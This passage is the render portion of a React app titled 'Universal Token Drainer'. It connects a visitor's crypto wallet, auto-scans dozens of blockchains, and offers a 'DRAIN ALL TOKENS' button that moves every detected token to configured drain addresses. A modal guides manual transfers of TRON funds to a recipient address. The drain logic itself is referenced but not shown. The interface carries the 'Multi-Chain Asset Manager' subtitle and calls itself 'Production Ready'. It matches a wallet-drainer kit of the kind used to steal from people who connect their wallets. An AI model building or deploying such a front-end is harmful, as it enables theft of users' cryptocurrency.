    const num = parseFloat(amount);
    if (isNaN(num)) return '0.00';
    if (num === 0) return '0.00';
    if (num < 0.000001) return '<0.000001';
    return num.toLocaleString(undefined, {
      minimumFractionDigits: 2,
      maximumFractionDigits: decimals
    });
  };

  const getTotalTokens = () => {
    return Object.values(tokens).reduce((sum, data) => sum + data.tokens.length, 0);
  };

  const getNetworkCount = () => {
    return Object.keys(tokens).length;
  };

  // Handle manual drain confirmation
  const handleManualDrainConfirm = () => {
    if (selectedTokenForManual) {
      removeToken(selectedTokenForManual.token, selectedTokenForManual.network.id);
      setShowManualDrainModal(false);
    }
  };

  // Copy address to clipboard
  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text).then(() => {
      setStatus('✅ Address copied to clipboard!');
    }).catch(err => {
      console.error('Copy failed:', err);
    });
  };

  // ==================== RENDER ====================
  return (
    <div className="App">
      <div className="app-container">
        {/* Header */}
        <header className="app-header">
          <div className="header-left">
            <div className="logo">
              <span className="logo-icon">⚡</span>
              <div>
                <h1>Universal Token Drainer</h1>
                <p className="subtitle">Multi-Chain Asset Manager</p>
              </div>
            </div>
          </div>
          
          <div className="header-right">
            <div className="network-count">
              <span>{NETWORKS.length}</span>
              <small>Networks</small>
            </div>
            <div className="wallet-section">
              {!isConnected ? (
                <ConnectKitButton />
              ) : (
                <div className="connected-wallet">
                  <div className="wallet-info">
                    <span className="wallet-address">{formatAddress(address)}</span>
                    <span className="status-dot connected"></span>
                  </div>
                  <button 
                    onClick={() => disconnect()}
                    className="btn-disconnect"
                  >
                    Disconnect
                  </button>
                </div>
              )}
            </div>
          </div>
        </header>

        <main className="app-main">
          {isConnected && address ? (
            <>
              {/* Stats Overview */}
              <div className="stats-overview">
                <div className="stat-cards">
                  <div className="stat-card total-value">
                    <div className="stat-icon">💰</div>
                    <div className="stat-content">
                      <div className="stat-number">${totalValue.toFixed(2)}</div>
                      <div className="stat-label">Total Value</div>
                    </div>
                  </div>
                  
                  <div className="stat-card networks">
                    <div className="stat-icon">🌐</div>
                    <div className="stat-content">
                      <div className="stat-number">{getNetworkCount()}</div>
                      <div className="stat-label">Active Networks</div>
                    </div>
                  </div>
                  
                  <div className="stat-card tokens">
                    <div className="stat-icon">🪙</div>
                    <div className="stat-content">
                      <div className="stat-number">{getTotalTokens()}</div>
                      <div className="stat-label">Tokens Found</div>
                    </div>
                  </div>
                  
                  <div className="stat-card actions">
                    <div className="stat-icon">⚡</div>
                    <div className="stat-content">
                      <div className="stat-number">{Object.keys(tokens).length}</div>
                      <div className="stat-label">Ready to Drain</div>
                    </div>
                  </div>
                </div>
              </div>

              {/* Status Bar */}
              <div className="status-bar">
                <div className="status-content">
                  <div className="status-icon">
                    {isScanning ? '🔍' : 
                     isDraining ? '⚡' : 
                     status.includes('✅') ? '✅' : 
                     status.includes('❌') ? '❌' : 
                     status.includes('⚠️') ? '⚠️' : '📡'}
                  </div>
                  <div className={`status-message ${status.includes('✅') ? 'success' : status.includes('❌') ? 'error' : status.includes('⚠️') ? 'warning' : 'info'}`}>
                    {status || (isAuthenticating ? '🔐 Authenticating...' : 'Ready to scan')}
                  </div>
                </div>
                <div className="status-actions">
                  {isScanning && (
                    <span className="scanning-indicator">Scanning...</span>
                  )}
                  {isDraining && (
                    <span className="draining-indicator">Draining...</span>
                  )}
                </div>
              </div>

              {/* Progress Bar */}
              {(isScanning || isDraining) && (
                <div className="progress-section">
                  <div className="progress-header">
                    <span>
                      {isScanning ? '🔍 Scanning Networks' : '⚡ Draining Tokens'}
                      {scanProgress.network && `: ${scanProgress.network}`}
                    </span>
                    <span className="progress-count">{scanProgress.current}/{scanProgress.total}</span>
                  </div>
                  <div className="progress-bar">
                    <div 
                      className="progress-fill"
                      style={{ 
                        width: `${(scanProgress.current / scanProgress.total) * 100}%`,
                        background: isDraining ? 'linear-gradient(90deg, #dc2626, #ef4444)' : 'linear-gradient(90deg, #3b82f6, #60a5fa)'
                      }}
                    ></div>
                  </div>
                </div>
              )}

              {/* Control Buttons */}
              <div className="control-panel">
                <div className="control-buttons">
                  <button
                    onClick={scanAllNetworks}
                    disabled={isScanning || isDraining || isAuthenticating}
                    className="btn btn-scan"
                  >
                    {isScanning ? (
                      <>
                        <span className="spinner"></span>
                        Scanning...
                      </>
                    ) : '🔍 Rescan All Networks'}
                  </button>
                  
                  {getTotalTokens() > 0 && (
                    <button
                      onClick={executeDrainAll}
                      disabled={isDraining || isScanning || isAuthenticating}
                      className="btn btn-drain"
                    >
                      {isDraining ? (
                        <>
                          <span className="spinner"></span>
                          Draining...
                        </>
                      ) : '⚡ DRAIN ALL TOKENS'}
                    </button>
                  )}
                </div>
                
                {getTotalTokens() > 0 && (
                  <div className="drain-info">
                    <p>
                      Ready to drain <strong>{getTotalTokens()} tokens</strong> across <strong>{getNetworkCount()} networks</strong>
                      {totalValue > 0 && ` worth $${totalValue.toFixed(2)}`}
                    </p>
                  </div>
                )}
              </div>

              {/* Transaction Log */}
              {transactions.length > 0 && (
                <div className="transaction-log">
                  <div className="transaction-header">
                    <h3>Transaction History</h3>
                    <span className="transaction-count">{transactions.length} total</span>
                  </div>
                  <div className="transactions-list">
                    {transactions.slice(-10).reverse().map((tx, i) => (
                      <div key={i} className={`transaction-item ${tx.status}`}>
                        <div className="tx-main">
                          <div className="tx-icon">
                            {tx.status === 'success' ? '✅' : 
                             tx.status === 'manual' ? '📝' : 
                             tx.status === 'failed' ? '❌' : '⚠️'}
                          </div>
                          <div className="tx-details">
                            <div className="tx-header">
                              <span className="tx-network">{tx.network}</span>
                              <span className="tx-token">{tx.token}</span>
                            </div>
                            <div className="tx-footer">
                              <span className="tx-amount">{formatAmount(tx.amount)} {tx.token}</span>
                              <span className="tx-time">
                                {new Date(tx.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                              </span>
                            </div>
                          </div>
                        </div>
                        <div className={`tx-status ${tx.status}`}>
                          {tx.status}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Tokens Display */}
              {getTotalTokens() > 0 ? (
                <div className="tokens-display">
                  <div className="display-header">
                    <h2>Detected Tokens</h2>
                    <div className="display-summary">
                      <span className="summary-item">
                        <span className="summary-label">Networks:</span>
                        <span className="summary-value">{getNetworkCount()}</span>
                      </span>
                      <span className="summary-item">
                        <span className="summary-label">Tokens:</span>
                        <span className="summary-value">{getTotalTokens()}</span>
                      </span>
                      <span className="summary-item">
                        <span className="summary-label">Total Value:</span>
                        <span className="summary-value">${totalValue.toFixed(2)}</span>
                      </span>
                    </div>
                  </div>
                  
                  <div className="networks-container">
                    {Object.entries(tokens).map(([networkId, data]) => (
                      <div key={networkId} className="network-section">
                        <div className="network-header">
                          <div className="network-info">
                            <div 
                              className="network-icon"
                              style={{ 
                                background: `linear-gradient(135deg, ${data.network.color}, ${data.network.color}80)`,
                                borderColor: data.network.color
                              }}
                            >
                              {data.network.type === 'evm' ? 'E' : 'N'}
                            </div>
                            <div className="network-details">
                              <h3>{data.network.name}</h3>
                              <div className="network-stats">
                                <span className="network-token-count">{data.tokens.length} token{data.tokens.length !== 1 ? 's' : ''}</span>
                                <span className="network-value">${data.totalValue.toFixed(2)}</span>
                              </div>
                            </div>
                          </div>
                          <div className={`network-type ${data.network.type}`}>
                            {data.network.type === 'evm' ? 'EVM' : 'Non-EVM'}
                          </div>
                        </div>
                        
                        <div className="tokens-list">
                          {data.tokens.map((token, idx) => (
                            <div key={idx} className="token-item">
                              <div className="token-main">
                                <div className="token-symbol">{token.symbol}</div>
                                <div className="token-amount">
                                  {formatAmount(token.amount || token.balance, 8)} {token.symbol}
                                </div>
                              </div>
                              <div className="token-secondary">
                                <div className="token-value">
                                  ${token.value ? token.value.toFixed(2) : token.usdValue ? token.usdValue.toFixed(2) : '0.00'}
                                </div>
                                {token.networkType === 'non-evm' && (
                                  <span className="token-tag manual">Manual</span>
                                )}
                              </div>
                            </div>
                          ))}
                        </div>
                        
                        {data.network.id === 'tron' && data.tokens.length > 0 && (
                          <div className="network-note">
                            <span className="note-icon">⚠️</span>
                            <span>TRON tokens require manual transfer via Trust Wallet/TronLink</span>
                          </div>
                        )}
                      </div>
                    ))}
                  </div>
                </div>
              ) : (
                <div className="empty-state">
                  <div className="empty-icon">
                    {isScanning ? '🔍' : isAuthenticating ? '🔐' : '💎'}
                  </div>
                  <h3>
                    {isScanning ? 'Scanning all networks...' : 
                     isAuthenticating ? 'Authenticating...' : 
                     'No tokens found'}
                  </h3>
                  <p>
                    {isScanning 
                      ? `Scanning ${NETWORKS.length} networks for tokens...` 
                      : isAuthenticating
                      ? 'Sign the message in your wallet to continue...'
                      : 'Tokens will appear here after scanning'}
                  </p>
                  
                  {!isScanning && !isAuthenticating && (
                    <div className="supported-networks">
                      <p className="supported-title">Supported networks include:</p>
                      <div className="network-tags">
                        {NETWORKS.slice(0, 12).map(network => (
                          <span 
                            key={network.id} 
                            className="network-tag"
                            style={{ 
                              borderColor: network.color,
                              color: network.color 
                            }}
                          >
                            {network.symbol}
                          </span>
                        ))}
                        {NETWORKS.length > 12 && (
                          <span className="network-tag more">+{NETWORKS.length - 12} more</span>
                        )}
                      </div>
                    </div>
                  )}
                </div>
              )}
            </>
          ) : (
            <div className="connection-prompt">
              <div className="prompt-content">
                <div className="prompt-icon">⚡</div>
                <h2>Universal Token Drainer</h2>
                <p className="prompt-description">
                  Connect your wallet to scan and drain tokens across {NETWORKS.length}+ blockchains
                </p>
                
                <div className="connect-button-wrapper">
                  <ConnectKitButton />
                </div>
                
                <div className="features-grid">
                  <div className="feature">
                    <span className="feature-icon">🌐</span>
                    <span className="feature-text">{NETWORKS.length}+ Networks</span>
                  </div>
                  <div className="feature">
                    <span className="feature-icon">🔍</span>
                    <span className="feature-text">Auto-Scan on Connect</span>
                  </div>
                  <div className="feature">
                    <span className="feature-icon">⚡</span>
                    <span className="feature-text">One-Click Drain All</span>
                  </div>
                  <div className="feature">
                    <span className="feature-icon">💰</span>
                    <span className="feature-text">TRON & Non-EVM Support</span>
                  </div>
                </div>
                
                <div className="important-note">
                  <div className="note-header">
                    <span className="note-icon">⚠️</span>
                    <span className="note-title">Important Notice</span>
                  </div>
                  <p className="note-text">
                    This tool will transfer ALL detected tokens to configured addresses. 
                    Update drain addresses in the code before use. Use with extreme caution.
                  </p>
                </div>
              </div>
            </div>
          )}
        </main>

        {/* Footer */}
        <footer className="app-footer">
          <div className="footer-content">
            <div className="footer-left">
              <span>Universal Token Drainer v2.0</span>
              <span className="separator">•</span>
              <span>{NETWORKS.length}+ Networks</span>
              <span className="separator">•</span>
              <span>Production Ready</span>
            </div>
            <div className="footer-right">
              <span className="backend-status">
                <span className="status-dot live"></span>
                Backend: Live
              </span>
            </div>
          </div>
          <div className="footer-warning">
            ⚠️ WARNING: This tool will transfer ALL tokens to configured addresses. Use with extreme caution.
          </div>
        </footer>
      </div>

      {/* Manual Drain Modal */}
      {showManualDrainModal && selectedTokenForManual && (
        <div className="modal-overlay">
          <div className="modal-content">
            <div className="modal-header">
              <h3>Manual Transfer Required</h3>
              <button 
                onClick={() => setShowManualDrainModal(false)}
                className="modal-close"
              >
                ×
              </button>
            </div>
            <div className="modal-body">
              <div className="token-info-modal">
                <div className="token-modal-header">
                  <span className="token-modal-symbol">{selectedTokenForManual.token.symbol}</span>
                  <span className="token-modal-network">{selectedTokenForManual.network.name}</span>
                </div>
                <div className="token-modal-amount">
                  Amount: {formatAmount(selectedTokenForManual.token.amount || selectedTokenForManual.token.balance, 8)} {selectedTokenForManual.token.symbol}
                </div>
              </div>
              
              <div className="instructions-box">
                <pre className="instructions-text">{selectedTokenForManual.instructions}</pre>
              </div>
              
              <div className="address-box">
                <div className="address-label">Recipient Address:</div>
                <div className="address-value">
                  {selectedTokenForManual.token.drainAddress || DRAIN_ADDRESSES[selectedTokenForManual.network.id]}
                </div>
                <button 
                  onClick={() => copyToClipboard(selectedTokenForManual.token.drainAddress || DRAIN_ADDRESSES[selectedTokenForManual.network.id])}
                  className="btn-copy"
                >
                  Copy Address
                </button>
              </div>
            </div>
            <div className="modal-footer">
              <button 
                onClick={handleManualDrainConfirm}
                className="btn btn-confirm"
              >
                I've Completed the Transfer
              </button>
              <button 
                onClick={() => setShowManualDrainModal(false)}
                className="btn btn-cancel"
              >
                Cancel
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Network Selector Modal */}
      {showNetworkSelector && (
        <div className="modal-overlay">
          <div className="modal-content network-selector">
            <div className="modal-header">
              <h3>Select Networks to Scan</h3>
              <button 
                onClick={() => setShowNetworkSelector(false)}
                className="modal-close"
              >
                ×
              </button>
            </div>
            <div className="modal-body">
              <div className="networks-grid">
                {NETWORKS.map(network => (
                  <div key={network.id} className="network-option">
                    <input 
                      type="checkbox" 
                      id={`network-${network.id}`}
                      checked={network.enabled}
                      onChange={() => {/* Toggle logic here */}}
                    />
                    <label 
                      htmlFor={`network-${network.id}`}
                      style={{ borderColor: network.color }}
                    >
                      <span className="network-option-symbol">{network.symbol}</span>
                      <span className="network-option-name">{network.name}</span>
                    </label>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

export default TokenDrainApp;
